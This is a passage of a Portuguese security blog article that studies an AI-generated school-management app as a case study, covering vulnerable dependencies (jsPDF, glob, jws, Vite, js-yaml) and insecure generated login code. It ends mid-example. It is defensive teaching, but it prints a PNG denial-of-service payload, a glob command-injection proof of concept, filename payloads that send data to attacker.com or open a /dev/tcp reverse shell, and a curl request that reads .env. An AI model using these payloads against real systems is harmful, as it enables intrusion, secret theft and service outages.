---
title: "Vibe Coding: Analisando riscos na prática"
description: "Análise completa de vulnerabilidades em projetos gerados por IA e plataformas no-code/low-code - um estudo de caso real"
date: 2025-12-17 20:00:00 -0300
last_modified_at: 2025-12-18 12:00:00 -0300
categories: [WayOfSec,AppSec,Hacking,Development,Programação,SecLab]
tags: [segurança, vulnerabilidades, vibecode, nocode, lowcode, lovable, ia, supply-chain, dependabot, cve, owasp, xss]
pin: false
math: false
mermaid: true
---

# A festa dos sonhos que pode virar pesadelo

> Uma análise profunda sobre os riscos de segurança em projetos gerados por IA, plataformas no-code e o fenômeno "vibe coding". Baseado em um estudo de caso real de um sistema escolar com 11 alertas de segurança detectados pelo Dependabot (4 de alta severidade) - e mais dezena de vulnerabilidades que nenhuma ferramenta encontrou. Esse caso real não é de uma escola de verdade, mas bem que poderia ser se as coisas continuarem assim. Eu mesmo que criei esse projeto na plataforma Lovable há 7 meses, e aqui vai meu relatório final - ou seja, quando falarmos neste artigo sobre dados de usuários (crianças ou professores) vazados, relaxem que estes não serão verdadeiros, o que quero mostrar é a possibilidade de ser.

---

## Sumário

1. [O Que é Vibe Coding?](#mas-afinal-o-que-é-esse-tal-de-vibe-coding)
2. [O Estudo de Caso: Escola em Foco](#o-estudo-de-caso-escola-em-foco)
3. [Vulnerabilidades nas Dependências](#vulnerabilidades-nas-dependências-supply-chain)
4. [As CVEs Mais Perigosas](#as-cves-mais-perigosas-explicadas)
5. [Vulnerabilidades no Código](#vulnerabilidades-no-código-gerado)
6. [Por Que a IA Erra Tanto](#afinal-por-que-a-ia-gera-código-tão-inseguro)
7. [Os Limites da Segurança Via Prompt](#mas-e-se-eu-pedir-segurança-no-prompt)
8. [Resumo do Estrago](#um-resumo-do-estrago)
9. [Como se Proteger](#como-não-cair-nessa)
10. [Glossário de Termos](#glossário-de-termos)
11. [Referências](#referências-e-links-úteis)

---

## Introdução

Lembro da primeira vez que tive a experiência de um "chat-bot inteligente" conversar comigo via texto... era mágico e em pouquíssimo tempo já estava conseguindo me gerar códigos ou corrigir meus erros de programação sem que eu recorresse ao stack overflow. Tempos depois meu irmão me apresentou um tipo de VSCode com diversas dessas IAs (como Cursor), pois estavam usando como ferramenta auxiliar na corporação que ele trabalha... e logo depois também foi surgindo então plataformas que criavam toda uma aplicação para você, até com banco de dados e hospedagem direto, tudo isso via prompt (como lovable) - ou seja, a pessoa descreve o que quer em português, e em segundos tem um sistema aparentemente funcionando. "Isso é o futuro!", muitos pensariam... e meio que é mesmo - mas como todo futuro, vem com suas armadilhas, cuidados e aprendizados.

Nos últimos meses, um fenômeno tomou conta do mundo dev: o **vibe coding**. A ideia é simples e sedutora - você descreve o que quer, a IA gera e você ajusta "no feeling" até funcionar. Plataformas como Lovable, Bolt, v0 e outras prometem criar aplicações completas em minutos. E cumprem! O problema é que "funcionar" e "ser seguro" são coisas muito diferentes (não vamos nem comentar em como essa bolha dev vibecoder está para estourar, vou deixar isso para o Akita).

Esse texto não é um ataque às ferramentas de IA ou plataformas no-code - elas têm seu lugar e utilidade. É um **alerta** sobre os **riscos** que muita gente ignora na empolgação da "mágica dev" na tela.

**O mercado está explodindo:** Segundo reportagens da TechCrunch (Nov/2025), a Lovable - uma das principais plataformas de vibe coding - atingiu **$200 milhões em ARR** (receita anual recorrente) e está próxima de **8 milhões de usuários**. A empresa se tornou unicórnio (avaliação de $1B+) em apenas 8 meses após o lançamento. Plataformas como **Bolt, v0 (Vercel), e Replit** seguem trajetórias similares. Embora este estudo foque no Lovable, todas essas plataformas utilizam stacks tecnológicas semelhantes (React, Node.js, ORMs modernos) e padrões de geração de código comparáveis - o que significa que os riscos documentados aqui provavelmente se aplicam de forma similar.

Vou usar como estudo de caso concreto/real de estudo: um sistema escolar chamado "Escola em Foco" totalmente gerado com a plataforma Lovable. Em apenas 7 meses de existência, o Dependabot do GitHub detectou **11 vulnerabilidades de segurança** nas dependências - incluindo 4 de severidade **HIGH**. E isso é só a ponta do iceberg.

Spoiler: analisando o código manualmente, encontrei aproximadamente mais duas **dezenas de vulnerabilidades** que nenhuma ferramenta automatizada detectou. Algumas tão básicas que dá até vergonha de mencionar.

**Metodologia:** Este estudo foi conduzido através de análise estática manual do código fonte, revisão sistemática dos alertas do Dependabot, mapeamento de fluxos de dados sensíveis, identificação de padrões inseguros comuns e **testes práticos de algumas vulnerabilidades durante o desenvolvimento**. Algumas funcionalidades foram testadas ativamente na época da criação do projeto - incluindo bypass de autenticação, manipulação de IDs em URLs e injeção de payloads em campos de upload. O projeto analisado foi criado por mim mesmo há 7 meses na plataforma Lovable e **não está em produção real** - serve apenas como case study para demonstrar os riscos. Todas as vulnerabilidades documentadas são reproduzíveis no código original.

**Limitações:** Este estudo analisa um único projeto gerado por uma plataforma específica (Lovable). Resultados podem variar em outros contextos, outras plataformas de vibe coding, ou versões mais recentes das ferramentas e até mesmo outros prompts. Não foi realizado teste de penetração formal completo com todas as fases de um pentest profissional - mas os testes práticos realizados durante o desenvolvimento comprovaram a explorabilidade das vulnerabilidades documentadas.

---

## Um Alerta Especial: LGPD e Dados de Menores

Antes de entrar no conteúdo técnico, preciso destacar algo crítico: o projeto analisado lida com **dados de crianças e adolescentes**. Isso não é um detalhe - é um agravante legal significativo.

A **Lei Geral de Proteção de Dados (LGPD)** tem disposições específicas sobre o tratamento de dados de menores de idade. O **Artigo 14** é claro:

> *"O tratamento de dados pessoais de crianças e de adolescentes deverá ser realizado em seu melhor interesse."*

**O que isso significa na prática?**

- **Consentimento específico**: Dados de crianças (menores de 12 anos) exigem consentimento específico de um dos pais ou responsável legal
- **Informação clara**: Os controladores devem manter pública a informação sobre os tipos de dados coletados e a forma de utilização
- **Responsabilidade reforçada**: A negligência no tratamento desses dados é vista com muito mais rigor pela ANPD (Autoridade Nacional de Proteção de Dados)

**As consequências de um vazamento:**

- **Multas**: Até 2% do faturamento da empresa, limitado a R$ 50 milhões por infração
- **Publicização**: A infração pode ser tornada pública após apuração
- **Bloqueio/eliminação**: A ANPD pode determinar bloqueio ou eliminação dos dados
- **Responsabilidade civil**: Ações judiciais de pais e responsáveis
- **Dano reputacional**: Difícil de quantificar, mas potencialmente fatal para startups

E aqui mora a ironia: quem usa vibe coding pra criar um "SaaS rapidinho" geralmente nem sabe que a LGPD existe. Não configura termos de uso, não implementa mecanismos de consentimento, não tem política de privacidade. O sistema funciona, o dinheiro entra, e a bomba-relógio fica ticando.

Quando (não "se") os dados vazarem, não adianta dizer "mas eu não sabia que tinha vulnerabilidade". A responsabilidade é objetiva. **Ignorância não é defesa.**

Com esse contexto legal em mente, vamos entender o que está gerando esses sistemas vulneráveis.

---

## Mas Afinal, O Que é Esse Tal de Vibe Coding?

"Vibe coding" é um termo que surgiu pra descrever essa nova forma de programar: você descreve o que quer, a IA gera, você testa, e vai ajustando "no feeling" até funcionar. Não precisa entender exatamente como funciona por baixo dos panos - se rodou, tá valendo.

E tem que admitir que é tentador. Você pensa em um sistema, descreve em português, e em minutos tem algo funcionando. Plataformas como Lovable e outras prometem exatamente isso: aplicações completas geradas por IA.

O problema começa quando "funcionando" vira sinônimo de "pronto". A ânsia de lançar um SaaS rápido, faturar logo e "validar a ideia" faz muita gente pular etapas cruciais.

A mentalidade de "empreendedor de sucesso" às vezes vira uma busca por atalhos. Quer construir rápido, quer lucrar rápido, quer escalar rápido. Só que ninguém pensa nas partes chatas: como **vender** esse sistema (e às vezes vender como "seguro" faz parte do marketing)? Como **manter** ele funcionando de forma segura? E principalmente: como **agir** quando der errado? Porque uma hora vai dar. E quando um sistema desses é explorado, não é só o projeto que morre - é a credibilidade, são os processos na justiça, são os dados dos clientes expostos.

Sim, qualquer empresa pode sofrer um vazamento. Até gigantes da tecnologia já foram invadidas. Mas isso não é desculpa pra negligenciar o básico. É como dizer "casas são assaltadas mesmo" e por isso deixar a porta destrancada, ou pior, com um bilhete na porta dizendo "chave debaixo do tapete". Roubar é crime? É. Mas a seguradora vai te ressarcir se você facilitou? Não vai. A LGPD vai te perdoar porque o hacker é que era malvado? Também não.


### Como Funciona na Prática

O ciclo típico de vibe coding é mais ou menos assim:

```mermaid
flowchart LR
    A["1. Descreve\n'quero um sistema...'"] --> B["2. IA Gera\nmilhares de linhas"]
    B --> C["3. Testa\n'funciona!'"] 
    C --> D["4. Deploy"]
    D --> E["5. Próxima feature"]
    E --> A
    
    style A fill:#4CAF50,color:#fff
    style B fill:#2196F3,color:#fff
    style C fill:#FF9800,color:#fff
    style D fill:#f44336,color:#fff
    style E fill:#9C27B0,color:#fff
```

1. Você descreve: "quero um sistema de gestão escolar com login, cadastro de alunos e geração de boletins"
2. A IA cospe código - às vezes milhares de linhas
3. Você testa: "funciona? funciona!"
4. Deploy
5. Próxima feature

Percebe o que tá faltando aí? **Entender o que foi gerado**, **Conceitos de Desenvolvimento Seguro**, **Revisão** e por último, mas não menos importante: **Testes de segurança**.

A galera confia na IA como se ela fosse um especialista infalível. "Se ela gerou assim, deve estar certo." Só que não tá. Muitas vezes tá longe de estar certo.

### Por que abstrair Não resolve

Deixa eu usar uma analogia que gosto. Imagina que você quer construir uma casa e contrata uma empresa que usa impressora 3D gigante. Em um dia a casa tá "pronta". Parece perfeita por fora. Você entra, tem parede, tem teto, tem porta.

Mas e se:
- A estrutura interna não aguenta um vento forte?
- As instalações elétricas foram feitas de qualquer jeito?
- As fechaduras são todas iguais - qualquer um com uma chave genérica entra?
- O material usado tem defeito que só aparece com o tempo?

Você tem uma casa que **parece** funcional, mas que pode desabar, pegar fogo, ou ser invadida a qualquer momento. E você nem sabe, porque nunca olhou o que tem dentro das paredes.

É **exatamente** isso que acontece com vibe coding. A complexidade não some - ela só fica escondida. E o que você não vê, você não protege.

---

## O Estudo de Caso: Escola em Foco

### Contexto

O "Escola em Foco" é um sistema de gestão escolar criado com a plataforma **Lovable**. A stack é moderna e comum:

- **Frontend:** React 18 + TypeScript + Vite
- **Estilização:** Tailwind CSS + Radix UI + shadcn/ui
- **Backend:** Node.js + Prisma ORM + PostgreSQL
- **Autenticação:** JWT + bcrypt
- **Geração de PDF:** jsPDF + html2canvas

À primeira vista, parece um projeto bem estruturado. A pasta `src/` está organizada em `components/`, `services/`, `hooks/`, `contexts/` - padrões modernos de React.

Mas quando você abre o capô...

### Visão geral das vulnerabilidades encontradas


| Categoria | Quantidade | Detectadas Por |
|-----------|------------|----------------|
| Dependências (HIGH) | 4 | Dependabot |
| Dependências (MODERATE) | 3 | Dependabot |
| Dependências (LOW) | 4 | Dependabot |
| Código (Graves) | 14+ | Análise Manual |
| **Total** | **25+** | - |

E isso em um projeto pequeno criado há uns **7 meses** atrás e já tendo falhas sendo alertadas no segundo mês. Imagina projetos maiores ou mais antigos. O mais assustador é que as notificações do Dependabot continuam chegando - conforme novas vulnerabilidades são descobertas nas bibliotecas, mais alertas aparecem. É uma corrida que você nunca ganha se não ficar de olho.

### Timeline de descoberta das Vulnerabilidades

Para ilustrar como as vulnerabilidades se acumulam ao longo do tempo:

| Período | Alertas Recebidos | Severidade |
|---------|-------------------|------------|
| Mês 2 (após criação) | 3 alertas | 1 HIGH, 2 LOW |
| Mês 4 | +4 alertas | 2 HIGH, 1 MODERATE, 1 LOW |
| Mês 6-7 | +4 alertas | 1 HIGH, 2 MODERATE, 1 LOW |
| **Total atual** | **11 alertas** | **4 HIGH, 3 MODERATE, 4 LOW** |

Observe que em apenas 7 meses, o projeto acumulou 11 alertas de segurança sem que nenhuma ação de correção fosse tomada. Isso é comum em projetos "vibe coded" - são criados, funcionam, e são esquecidos enquanto as vulnerabilidades se acumulam silenciosamente.

---

## Vulnerabilidades nas Dependências (Supply Chain)

### O que é um Ataque de Supply Chain?

Antes de entrar nas vulnerabilidades específicas, preciso explicar o que é isso e por que importa.

Pensa assim: quando você faz um bolo, compra os ingredientes no mercado. Farinha, ovos, açúcar. Você confia que esses ingredientes estão bons. Mas e se a farinha veio contaminada de fábrica? Não importa quão bem você siga a receita - o bolo vai estar estragado porque um ingrediente estava comprometido desde o início.

Em software é igual. Quando você instala uma biblioteca (tipo `npm install react`), está confiando que essa biblioteca é segura. Mas cada biblioteca pode ter suas próprias dependências, que têm outras dependências, que têm outras... No final, seu projeto pode ter **centenas ou milhares** de pacotes que você nem sabe que existem.

No projeto Escola em Foco, o `package.json` lista mais de 50 dependências diretas. Mas quando você roda `npm install`, baixa muito mais que isso. Cada uma dessas é um potencial ponto de entrada pra um atacante.

Se uma dessas dependências - **qualquer uma delas** - tiver uma vulnerabilidade, seu projeto inteiro fica exposto. Mesmo que seu código seja perfeito.

### Os 11 Alertas do Dependabot

O GitHub tem uma ferramenta chamada Dependabot que fica monitorando suas dependências e te avisa quando encontra vulnerabilidades conhecidas. No projeto Escola em Foco, ele encontrou 11:

> **Nota sobre as CVEs:** Todas as vulnerabilidades listadas abaixo são de 2025 - ou seja, são vulnerabilidades recentes, descobertas neste ano. Isso demonstra como o ecossistema de segurança está em constante evolução: bibliotecas que eram "seguras" ontem podem ter falhas críticas descobertas amanhã. Se você está lendo isso no futuro, provavelmente existem ainda mais CVEs além dessas.

#### 🔴 Críticas (HIGH) - 4 alertas

| CVE | Biblioteca | O Que Faz |
|-----|------------|-----------|
| CVE-2025-57810 | jsPDF | Trava o browser com PNG malicioso |
| CVE-2025-57810 | jsPDF | (duplicado no package-lock) |
| CVE-2025-64756 | glob | Executa comandos via nomes de arquivos |
| CVE-2025-65945 | jws | Permite forjar tokens de autenticação |

#### 🟠 Moderadas (MODERATE) - 3 alertas

| CVE | Biblioteca | O Que Faz |
|-----|------------|-----------|
| CVE-2025-62522 | Vite | Lê arquivos que deveriam estar bloqueados |
| CVE-2025-62522 | Vite | (duplicado no package-lock) |
| N/A | js-yaml | Permite "poluir" objetos do JavaScript |

#### 🟡 Baixas (LOW) - 4 alertas

| CVE | Biblioteca | O Que Faz |
|-----|------------|-----------|
| N/A | Vite | Vaza arquivos do servidor de desenvolvimento |
| N/A | Vite | (duplicado) |
| N/A | Vite | Outro vazamento de arquivos |
| N/A | Vite | (duplicado) |

Agora deixa eu explicar em detalhe as mais perigosas, porque só ver a tabela não dá pra entender o impacto real.

---

## As CVEs mais perigosas (Explicadas)

### jsPDF: O PNG que Trava Tudo

**CVE-2025-57810** - Severidade HIGH (CVSS 4.0: 8.7/10)

**Fraquezas associadas:** CWE-20 (Improper Input Validation), CWE-835 (Loop with Unreachable Exit Condition)

O jsPDF é uma biblioteca pra gerar PDFs no navegador. O projeto Escola em Foco usa ela pra gerar boletins dos alunos. Até aí, tudo normal.

**O que é Denial of Service (DoS)?**

Antes de explicar a vulnerabilidade, deixa eu contextualizar. DoS (Denial of Service - Negação de Serviço) é um tipo de ataque onde o objetivo não é roubar dados, mas **impedir que o sistema funcione**. É como se alguém trancasse a porta da sua loja - você não perdeu nada lá dentro, mas ninguém consegue entrar pra comprar.

**A vulnerabilidade:**

A função `addImage()` do jsPDF não valida direito as imagens PNG que recebe. Se você passar um PNG especialmente construído (com só 9 bytes específicos!), a biblioteca entra num **loop infinito** - fica processando pra sempre, sem terminar.

```javascript
// Esses 9 bytes causam um loop infinito
const payload = new Uint8Array([117, 171, 90, 253, 166, 154, 105, 166, 154])

const doc = new jsPDF();
doc.addImage(payload, "PNG", 10, 40, 180, 180);
// Nunca termina. CPU vai pra 100%. Browser trava.
```

**Por que 9 bytes travam tudo?**

O PNG é um formato de imagem com estrutura específica. A biblioteca espera receber um arquivo válido e tenta decodificar. Quando recebe esses bytes "quebrados", ela entra num ciclo tentando encontrar algo que não existe - como procurar uma página num livro que não tem fim.

**Cenário de ataque no projeto:**

O sistema permite que administradores façam upload da logo da escola e que qualquer usuário logado envie sua foto de perfil. Várias funções geram PDFs no sistema: boletins, documentos, matrículas, diário de presença, etc. Alguns desses documentos incluem a logo da escola (todos) ou imagem dos alunos. Um atacante enviando um PNG malicioso poderia ocasionar um DoS. 

Então, por exemplo, quando qualquer usuário tenta gerar um boletim com essa logo alterada... o browser trava. Se várias pessoas tentarem ao mesmo tempo, ou se a geração de PDF rodar no servidor (pra gerar em lote, por exemplo), você tem um denial of service afetando todos os usuários.

**Curiosidade técnica:** O pesquisador Aleksey Solovev da Positive Technologies descobriu essa vulnerabilidade. Ela afeta não só `addImage()`, mas também o método `html()` do jsPDF.

**Correção:** Atualizar jsPDF para versão >= 3.0.2 & Verificação de PNGs maliciosos

```bash
# Comando para correção - instalar versão específica
npm install jspdf@^3.0.2 --save

# Verificar se a atualização foi aplicada
npm ls jspdf
```

---

### glob: Nomes de arquivos que executam comandos

**CVE-2025-64756** - Severidade HIGH (CVSS 3.1: 7.5/10)

**Fraqueza associada:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)

Essa aqui é assustadora. O `glob` é uma biblioteca que busca arquivos por padrão - tipo quando você quer achar todos os arquivos `.js` de um projeto. Parece inofensivo, né?

O problema tá na CLI (interface de linha de comando) do glob. Quando você usa a opção `-c` pra executar um comando nos arquivos encontrados, o glob passa os nomes dos arquivos pro shell. E o shell interpreta caracteres especiais.

Então se um atacante criar um arquivo com um nome tipo:

```bash
$(curl https://hacker.com/pwned)
```

E alguém rodar glob nessa pasta, o shell vai interpretar `$(...)` como "execute isso". O curl é executado, e o atacante sabe que o sistema foi comprometido.

**Proof of Concept (PoC):**

```bash
# Cria diretório de teste
mkdir test_directory && cd test_directory

# Cria arquivo com payload de command injection no nome
touch '$(touch injected_poc)'

# Executa glob com a opção -c
node /path/to/glob/dist/esm/bin.mjs -c echo "**/*"

# Resultado: além do echo, o comando $(touch injected_poc) é executado
# Um arquivo "injected_poc" é criado - provando a execução de código arbitrário
```

Exemplos de payloads mais perigosos que poderiam estar no nome do arquivo:
- `$(curl -X POST https://attacker.com/exfil -d "$(whoami):$(pwd)")` - exfiltração de dados
- `$(env | grep -E "(TOKEN|KEY|SECRET)" > /tmp/secrets.txt)` - roubo de variáveis de ambiente
- `$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)` - reverse shell

**Por que isso importa pro projeto?**

O `glob` não é uma dependência direta - ele vem junto com `tailwindcss` e `lovable-tagger`. Mas em pipelines de CI/CD (aqueles sistemas que rodam build e deploy automaticamente), ferramentas frequentemente usam glob pra processar arquivos.

**Versões afetadas:** 10.2.0 até 11.0.3 | **Patches:** 10.5.0 ou 11.1.0

Cenário de ataque: 
1. Atacante faz um Pull Request com um arquivo de nome malicioso
2. O CI do projeto processa os arquivos
3. O nome do arquivo é interpretado como comando
4. Atacante tem acesso a tokens, secrets, tudo que o CI tem acesso

**Correção:** Atualizar glob para versão >= 10.5.0 ou >= 11.1.0

```bash
# Se glob for dependência direta
npm install glob@^10.5.0 --save   # ou glob@^11.1.0

# Se for dependência transitiva (via tailwindcss, por exemplo)
npm update tailwindcss  # atualiza e puxa glob corrigido

# Alternativa: usar --cmd-arg/-g ao invés de -c
# Ou usar --shell para manter comportamento antigo com cuidado

# Verificar versão atual
npm ls glob
```

---

### jws: Forjando Tokens de Autenticação

**CVE-2025-65945** - Severidade HIGH (CVSS 3.1: 7.5/10)

**Fraqueza associada:** CWE-347 (Improper Verification of Cryptographic Signature)

Antes de explicar essa vulnerabilidade, deixa eu contextualizar o que é JWT e por que isso importa.

**JWT (JSON Web Token)** é basicamente um "crachá digital". Quando você faz login em um sistema, o servidor gera um JWT que contém suas informações (ID, nome, cargo) e uma **assinatura digital**. Essa assinatura é criada usando uma chave secreta que só o servidor conhece.

A cada requisição que você faz, envia esse token. O servidor verifica: "essa assinatura bate com a minha chave secreta?" Se bater, confia nas informações do token. Se não bater, rejeita.

A biblioteca `jws` (JSON Web Signature) é responsável por criar e verificar essas assinaturas. O problema? Ela tinha um bug na verificação de assinaturas HMAC (um tipo específico de assinatura). Em certas condições, dava pra enganar a verificação - criar um token falso que o sistema aceitava como legítimo.

**Versões afetadas:** ≤3.2.2 e 4.0.0 | **Patches:** 3.2.3 ou 4.0.1

É como se você conseguisse falsificar o crachá de um funcionário tão bem que o leitor da porta não detectasse a fraude.

No projeto Escola em Foco, olha o que tem no token:

```typescript
private static generateToken(userId: string, role: string): string {
  return jwt.sign(
    { userId, role },  // O token contém o ID e a ROLE do usuário
    process.env.JWT_SECRET || 'default_secret',
    { expiresIn: '24h' }
  );
}
```

O token carrega o ID e o **role** (cargo) do usuário. Se você consegue forjar tokens, pode criar um token que diz `role: 'ADMIN'` - e pronto, virou administrador do sistema inteiro.

**Pra quem quer entender mais a fundo:** A vulnerabilidade específica acontece quando você usa `jws.createVerify()` (não `jws.verify()`) com algoritmos HMAC e busca a chave secreta baseado em dados do próprio token. É um cenário específico, mas o projeto usa `jsonwebtoken` que depende do `jws`, então vale ficar atento.

**Créditos:** Vulnerabilidade descoberta por Félix Charette (agradecimentos da Okta/Auth0).

**Correção:** Atualizar jws para versão >= 3.2.3

```bash
# Se usar jsonwebtoken (que depende do jws)
npm update jsonwebtoken

# Ou instalar versão específica do jws
npm install jws@^3.2.3 --save

# Verificar a árvore de dependências
npm ls jws
```

---

### Vite: Lendo arquivos Secretos (Path Traversal)

**CVE-2025-62522** - Severidade MODERATE (CVSS 4.0: 6.3/10)

**Fraqueza associada:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

Pra entender essa vulnerabilidade, primeiro preciso explicar o que é o Vite e como ele funciona.

**O que é o Vite?**

Vite é uma ferramenta de build pra projetos frontend modernos. Durante o desenvolvimento, ele cria um servidor local que serve seus arquivos. Você acessa `http://localhost:5173` e vê sua aplicação rodando.

Mas o Vite também tem uma configuração de segurança chamada `server.fs.deny` que bloqueia acesso a certos arquivos. Por padrão, arquivos como `.env`, `.env.local`, certificados (`.pem`, `.crt`) são bloqueados - porque você não quer que qualquer pessoa vendo seu site consiga ler esses arquivos sensíveis.

**O bug:**

No Windows, o Vite falhava em normalizar os caminhos de arquivo corretamente. Se você adicionasse uma barra invertida (`\`) no final da URL, o sistema de bloqueio não reconhecia o arquivo como proibido:

```bash
# Tentativa normal - bloqueada corretamente
curl http://localhost:5173/.env
# Resposta: 403 Forbidden ✅

# Com barra invertida no Windows - bypass!
curl --request-target /.env\ http://localhost:5173
# Resposta: Todo o conteúdo do .env !!!!!!
```

Isso é um clássico de vulnerabilidades em Windows: diferenças no tratamento de `/` vs `\` causando bypasses. O sistema de arquivos do Windows aceita ambos, mas a validação só verificava um.


<img width="90%" alt="image" src="https://github.com/user-attachments/assets/3392e1ea-3634-4590-83a9-57b6794d150d" />

> **Legenda:** Imagem tirada do GitHub Security Advisory dessa vulnerabilidade, nela está demonstrando a exploração via Burp Suite - ferramenta comum em testes de penetração. A requisição com a barra invertida bypassa completamente a proteção `server.fs.deny` e retorna o conteúdo do arquivo `.env`.

**Por que isso é grave pro projeto?**

O `.env` do Escola em Foco contém:

```bash
DATABASE_URL="postgresql://postgres:gta123@localhost:5432/escola_em_foco"
JWT_SECRET="escola_em_foco_secret_key_2024"
```

Sim, a senha do banco de dados é **gta123**. Referência ao jogo? Provavelmente (claro que foi rsrs). Senha segura? Definitivamente não.

Se alguém conseguisse ler esse arquivo:
- Tem a senha do banco de dados (e uma senha trivial dessas, dá até pra chutar)
- Tem o JWT_SECRET pra forjar tokens de autenticação
- Pode acessar o banco diretamente se o PostgreSQL estiver exposto na rede

**Outras vulnerabilidades relacionadas do Vite:**

O Dependabot encontrou mais 4 alertas de severidade LOW relacionados ao Vite. Dois deles envolvem cenários parecidos:

1. **CVE-2025-58751**: Se existir um symlink dentro do diretório `public`, arquivos fora da raiz podem ser acessados via path traversal (`/../../../etc/passwd` no Linux, por exemplo). Este CVE tem **EPSS no 84th percentile** - extremamente alto, indicando alta probabilidade de exploração ativa.

2. **CVE-2025-58752**: Arquivos HTML especificamente não eram validados contra o `server.fs.deny`. Ou seja, se você tivesse um `secret.html` na lista de bloqueio, ele seria servido mesmo assim. **Este também afeta o preview server**, não apenas o dev server.

**Condições para exploração:**
- O dev server (ou preview server) precisa estar exposto na rede (usando `--host` ou `server.host: true`)
- No caso do CVE-2025-62522, precisa estar rodando em Windows

**Correção:** Atualizar Vite para versão >= 6.4.1 (ou >= 6.3.6 para as LOW)

```bash
# Instalar Vite na versão corrigida
npm install vite@^6.4.1 --save-dev

# Verificar se a atualização foi aplicada
npm ls vite
```

---

### js-yaml: Poluindo Objetos (Prototype Pollution)

**CVE-2025-64718** - Severidade MODERATE (CVSS 3.1: 5.3/10)

**Fraqueza associada:** CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes)

Essa é mais sutil, mas preciso explicar direito porque Prototype Pollution é um conceito que confunde muita gente.

**Versões afetadas:** 4.0.0-4.1.0 e também 3.14.1 e anteriores | **Patches:** 4.1.1 ou 3.14.2

**O que são prototypes?**

Em JavaScript, todo objeto "herda" propriedades de um objeto pai chamado **prototype**. É como uma família: se a família tem o sobrenome "Silva", todos os filhos nascem Silva - a menos que você explicitamente mude.

```javascript
// Criando um objeto simples
const user = { name: "João" };

// user não tem a propriedade "isAdmin" definida
console.log(user.isAdmin); // undefined
```

**O ataque:**

Prototype Pollution acontece quando um atacante consegue modificar o prototype "pai". Isso afeta TODOS os objetos do sistema.

```javascript
// Atacante injeta isso de alguma forma (via YAML malicioso, por exemplo)
Object.prototype.isAdmin = true;

// Agora TODO objeto que não tenha isAdmin definido...
const user = { name: "João" };
console.log(user.isAdmin); // true! !!!!!!!!!!!!!!!

const outroUser = { name: "Maria" };
console.log(outroUser.isAdmin); // true também!
```

Voltando à analogia da família: é como se o atacante conseguisse alterar a certidão de nascimento da "família JavaScript" pra dizer que todos os membros são administradores.

**No js-yaml:**

A vulnerabilidade está no operador de merge (`<<`). Se um atacante conseguir controlar o input YAML que o sistema processa, pode contaminar prototypes. Imagina um sistema que lê configurações de um arquivo YAML enviado pelo usuário - aí mora o perigo.

**Impacto real:**

- Bypass de verificações de segurança (`if (user.isAdmin)` passa a ser true pra todo mundo)
- Execução de código em certos contextos
- Denial of Service

**Correção:** Atualizar js-yaml para versão >= 4.1.1

```bash
# Instalar js-yaml na versão corrigida
npm install js-yaml@^4.1.1 --save

# Ou atualizar todas as dependências
npm update  # atualiza tudo e resolve dependências transitivas

# Verificar versão instalada
npm ls js-yaml
```

**Curiosidade:** No Deno (runtime alternativo ao Node.js), a proteção contra prototype pollution vem ativada por padrão. No Node.js, você pode usar `node --disable-proto=delete` pra se proteger.

---

## Vulnerabilidades no Código Gerado

Até aqui, vimos as vulnerabilidades que o Dependabot encontrou automaticamente nas dependências - problemas em código de terceiros que o projeto importa. Mas e o código que a IA gerou diretamente? Será que tá tudo certinho?

Spoiler: não.

Quando fui analisar o código manualmente - linha por linha, arquivo por arquivo - encontrei coisas que nenhuma ferramenta automatizada detectou. São aqueles problemas que só um humano (ou um atacante) consegue perceber, porque envolvem **lógica de negócio** e **contexto** que robôs não entendem.

O que vou mostrar agora é assustador. Não porque são vulnerabilidades super complexas - pelo contrário, são erros **básicos** que qualquer desenvolvedor com um mínimo de conhecimento em segurança evitaria. Mas a IA simplesmente... não evitou.

### A autenticação que não autentica

Vamos começar pelo mais grave. A autenticação. Aquela coisa que deveria garantir que só pessoas autorizadas acessem o sistema. No arquivo `src/contexts/AuthContext.tsx`, encontrei isso:

```typescript
// Usuários de teste para demonstração
const MOCK_USERS: User[] = [
  {
    id: '1',
    name: 'Administrador',
    email: 'admin',
    role: 'ADMIN',
  },
  {
    id: '2', 
    name: 'Professora Silva',
    email: 'professoras',
    role: 'TEACHER',
  },
  // ... mais usuários mockados
];

const login = async (email: string, password: string): Promise<boolean> => {
  // ...
  const foundUser = MOCK_USERS.find(u => u.email === email);
  
  // Verifica se a senha corresponde ao nome de usuário
  if (foundUser && password === email) {
    setUser(foundUser);
    localStorage.setItem('user', JSON.stringify(foundUser));
    return true;
  }
  return false;
};
```

Deixa eu explicar o que tá acontecendo aqui, porque é pior do que parece.

**"Mock users"** são usuários falsos, de mentirinha, que desenvolvedores usam durante o desenvolvimento pra testar funcionalidades sem precisar de um banco de dados de verdade. Faz sentido usar isso enquanto tá programando - mas quem vibecoda nem sabe que está assim. O problema é que esses usuários **nunca deveriam chegar em produção**.

Pois chegaram.

O código procura um usuário pelo email na lista de usuários mockados. Se encontrar, compara a senha com... o próprio email. Sim, você leu certo: `password === email`. A senha do admin é "admin". A senha de "professoras" é "professoras". A senha de "aluno" é "aluno".

Pior ainda: o campo de email aceita só "admin" como entrada. Não precisa ser um email válido. Você literalmente digita:

```
Campo de email: admin
Campo de senha: admin
```

E pronto. Acesso total como administrador de um sistema que gerencia dados de crianças.

"Ah Matheus, mas é só um projeto de teste." Sim, a IA fez assim para facilitar testes, mas quem está no vibe code pode não entender isso e jogar para produção... então imagine se alguém joga esse código em produção sem revisar? Quantos sistemas por aí foram feitos assim "rapidinho" e estão rodando com alguma dessas vulnerabilidades? Pode ser que seu projeto não tenha essa estrutura de login, mas pode ser a chance de acontecer, e ficar apenas no prompt pode te fazer não perceber isso.

Para deixar claro os problemas:

1. **Usuários hardcoded no código** - Qualquer pessoa que leia o código fonte sabe as credenciais
2. **Senha = email** - Trivial de adivinhar
3. **Sem hash de senha** - Comparação em texto plano
4. **Dados no localStorage** - Vulnerável a qualquer XSS na página
5. **Sem rate limiting** - Dá pra testar milhares de combinações por segundo
6. **Sem validação de formato** - "admin" não é um email válido, mas funciona

Sim, é isso mesmo. Para ter acesso de administrador a um sistema escolar com dados de crianças, basta digitar `admin` / `admin`. Mas beleza, era um projeto teste em produção e login assim pode ter sido feito para acessar mais rapidamente, mas não duvidaria que quem faz vibecoding não iria se atentar a atualizar isso depois.

**Mas pera, fica pior:**

Sabe o que a IA fez pra "ajudar" os usuários? Colocou as credenciais **na própria tela de login**:

```tsx
<div className="mt-6 space-y-2 border-t pt-4 text-sm text-gray-600">
